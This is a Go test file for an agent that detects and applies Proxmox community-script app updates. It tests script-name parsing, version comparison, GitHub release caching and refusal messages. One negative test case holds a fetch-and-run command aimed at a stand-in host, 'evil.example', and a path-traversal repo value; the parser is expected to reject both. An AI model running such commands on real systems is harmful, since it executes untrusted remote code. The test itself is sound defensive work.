package agent

import (
	"context"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// Excerpts of real ct scripts, in each shape the agent follows or refuses.
func TestParseCommunityScript(t *testing.T) {
	cases := map[string]struct {
		script string
		want   []communityCheck
	}{
		"plain": {`  if check_for_gh_release "bentopdf" "alam00000/bentopdf"; then`,
			[]communityCheck{{App: "bentopdf", Repo: "alam00000/bentopdf"}}},
		"pinned by a variable the script sets": {`RELEASE="v2.6.3"
VCHORD_RELEASE="0.5.3"
  if check_for_gh_release "Immich" "immich-app/immich" "${RELEASE}" "each release is tested individually"; then
  if check_for_gh_release "VectorChord" "supervc-stack/VectorChord" "${VCHORD_RELEASE}" "updated together"; then`,
			[]communityCheck{{App: "Immich", Repo: "immich-app/immich", Pinned: "v2.6.3"}, {App: "VectorChord", Repo: "supervc-stack/VectorChord", Pinned: "0.5.3"}}},
		"a pin that cannot be resolved is dropped, not guessed": {`  if check_for_gh_release "authentik" "goauthentik/authentik" "${AUTHENTIK_VERSION}"; then`, nil},
		"several apps": {`check_for_gh_release "geoipupdate" "maxmind/geoipupdate" && x
if check_for_gh_release "xmlsec" "lsh123/xmlsec" "1.3.11"; then`,
			[]communityCheck{{App: "geoipupdate", Repo: "maxmind/geoipupdate"}, {App: "xmlsec", Repo: "lsh123/xmlsec", Pinned: "1.3.11"}}},
		"other forges are not followed": {`if check_for_codeberg_release "autocaliweb" "gelbphoenix/autocaliweb"; then`, nil},
		"a repo that is not owner/repo": {`check_for_gh_release "x" "../../etc"`, nil},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			got := parseCommunityScript(c.script)
			if len(got) != len(c.want) {
				t.Fatalf("got %+v", got)
			}
			for i := range got {
				if got[i] != c.want[i] {
					t.Errorf("got %+v, want %+v", got[i], c.want[i])
				}
			}
		})
	}
	if f := (communityCheck{App: "Immich"}).versionFile(); f != "/root/.immich" {
		t.Errorf("version file %s", f)
	}
}

func TestVersionAfter(t *testing.T) {
	for _, c := range []struct {
		a, b string
		want bool
	}{
		{"1.2.0", "1.1.5", true}, {"1.1.5", "1.2.0", false}, {"26.05.3", "26.05.2", true}, {"1.0.32.1", "1.0.32.0", true},
		{"2.0", "2.0.0", false}, {"2.0.0", "2.0", false}, {"1.10.0", "1.9.9", true}, {"1.0.0-beta", "1.0.0", false},
	} {
		if got := versionAfter(c.a, c.b); got != c.want {
			t.Errorf("versionAfter(%s, %s) = %v", c.a, c.b, got)
		}
	}
}

func TestCommunityScriptName(t *testing.T) {
	d := t.TempDir()
	w := func(s string) string { p := filepath.Join(d, "update"); os.WriteFile(p, []byte(s), 0o755); return p }
	if n := communityScriptName(w(`bash -c "$(curl -fsSL https://raw.githubusercontent.com/community-scripts/ProxmoxVE/main/ct/bentopdf.sh)"`)); n != "bentopdf" {
		t.Errorf("got %q", n)
	}
	// With the proxy preamble some installs have.
	if n := communityScriptName(w(`set -a; [ -f /etc/profile.d/90-http-proxy.sh ] && . /etc/profile.d/90-http-proxy.sh; set +a; bash -c "$(curl -fsSL https://raw.githubusercontent.com/community-scripts/ProxmoxVE/main/ct/bookstack.sh)"`)); n != "bookstack" {
		t.Errorf("got %q", n)
	}
	for cmd, want := range map[string]string{
		`bash -c "$(wget -qLO - https://github.com/community-scripts/ProxmoxVE/raw/main/ct/homebridge.sh)"`:           "ProxmoxVE/homebridge",
		`bash -c "$(curl -fsSL https://raw.githubusercontent.com/community-scripts/ProxmoxVED/main/ct/authentik.sh)"`: "ProxmoxVED/authentik",
	} {
		if r, n := communityScript(w(cmd)); r+"/"+n != want {
			t.Errorf("%s: got %s/%s", cmd, r, n)
		}
	}
	generated := `#!/usr/bin/env bash
# Community-Scripts update entrypoint (generated - do not edit by hand).
export SCRIPT_SLUG="bentopdf"
export UPDATE_SCRIPT_NAME="bentopdf"
export COMMUNITY_SCRIPTS_URL="https://raw.githubusercontent.com/community-scripts/ProxmoxVE/main"
export COMMUNITY_SCRIPTS_CORE_URL="https://raw.githubusercontent.com/community-scripts/core/main"
_cs_helper="$(curl -fsSL --connect-timeout 10 "${COMMUNITY_SCRIPTS_CORE_URL}/misc/update.sh" 2>/dev/null)"
`
	if r, n := communityScript(w(generated)); r+"/"+n != "ProxmoxVE/bentopdf" {
		t.Errorf("generated entrypoint: got %s/%s", r, n)
	}
	for _, other := range []string{`apt-get update`, `bash -c "$(curl -fsSL https://evil.example/ct/x.sh)"`, `bash -c "$(curl https://raw.githubusercontent.com/someone-else/ProxmoxVE/main/ct/x.sh)"`} {
		if n := communityScriptName(w(other)); n != "" {
			t.Errorf("%q gave %q", other, n)
		}
	}
	if communityScriptName(filepath.Join(d, "missing")) != "" {
		t.Error("a missing update command named a script")
	}
}

func TestSplitCommunityPatches(t *testing.T) {
	os_, apps := splitCommunityPatches([]string{"openssl", "community-script:bentopdf", "curl"})
	if strings.Join(os_, ",") != "openssl,curl" || strings.Join(apps, ",") != "community-script:bentopdf" {
		t.Errorf("%v %v", os_, apps)
	}
}

// Latest releases come from GitHub once per interval, and a failure leaves
// the app out rather than failing the OS list.
func TestCommunityLatestTagCaching(t *testing.T) {
	calls := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		calls++
		if strings.Contains(r.URL.Path, "/broken/") {
			w.WriteHeader(http.StatusForbidden)
			return
		}
		w.Write([]byte(`{"tag_name":"v1.2.0"}`))
	}))
	defer srv.Close()
	old := communityGitHub
	communityGitHub = srv.URL
	defer func() { communityGitHub = old }()
	c := &communityApps{client: srv.Client(), logger: slog.New(slog.DiscardHandler), latest: map[string]cachedLatest{}}
	for range 3 {
		if tag, err := c.latestTag(context.Background(), "owner/app", time.Now()); err != nil || tag != "v1.2.0" {
			t.Fatal(tag, err)
		}
	}
	if _, err := c.latestTag(context.Background(), "broken/app", time.Now()); err == nil {
		t.Error("a refused request read as a release")
	}
	if calls != 2 {
		t.Errorf("GitHub asked %d times", calls)
	}
}

// TestLiveCommunityApps runs the detection on a real community-scripts LXC.
// It only reads: the update command, the version files and GitHub. Opt-in:
// MUSTRA_LIVE_COMMUNITY=1.
func TestLiveCommunityApps(t *testing.T) {
	if os.Getenv("MUSTRA_LIVE_COMMUNITY") == "" {
		t.Skip("set MUSTRA_LIVE_COMMUNITY=1 on a community-scripts LXC")
	}
	c := &communityApps{client: &http.Client{Timeout: 20 * time.Second}, logger: slog.Default(), latest: map[string]cachedLatest{}}
	name := communityScriptName(communityUpdateCmd)
	got := c.pending(context.Background())
	t.Logf("script=%s checks=%+v pending=%+v", name, c.checks, got)
}

// TestLiveCommunityApply applies a pending community-script app update the
// way a patch run would. It changes the system: only on a throwaway LXC.
// Opt-in: MUSTRA_LIVE_COMMUNITY_APPLY=<patch name>.
func TestLiveCommunityApply(t *testing.T) {
	name := os.Getenv("MUSTRA_LIVE_COMMUNITY_APPLY")
	if name == "" {
		t.Skip("set MUSTRA_LIVE_COMMUNITY_APPLY=community-script:<app> on a throwaway LXC")
	}
	defaultCommunityApps.logger = slog.Default()
	before := defaultCommunityApps.pending(context.Background())
	t.Logf("before: %+v", before)
	res, err := applyPatches(context.Background(), nil, "", []string{name}, false, func(stage, detail string, n int) { t.Logf("progress: %s %s", stage, detail) })
	tail := res.Output
	if len(tail) > 3000 {
		tail = tail[len(tail)-3000:]
	}
	t.Logf("err=%v notes=%v failed=%v\n--- output tail ---\n%s", err, res.Notes, res.Failed, tail)
	after := defaultCommunityApps.pending(context.Background())
	t.Logf("after: %+v", after)
	if err != nil {
		t.Fatal(err)
	}
	for _, p := range after {
		if p.Name == name {
			t.Errorf("%s still pending after the update", name)
		}
	}
}

func TestCommunityRefusal(t *testing.T) {
	out := "  💡    May cause data loss!\n  ✖️    Not continuing: LXC is under-provisioned and there is nobody to ask.\n"
	if got := communityRefusal(out); got != "Not continuing: LXC is under-provisioned and there is nobody to ask." {
		t.Errorf("got %q", got)
	}
	if communityRefusal("all fine\n") != "" {
		t.Error("found a refusal in a clean run")
	}
}
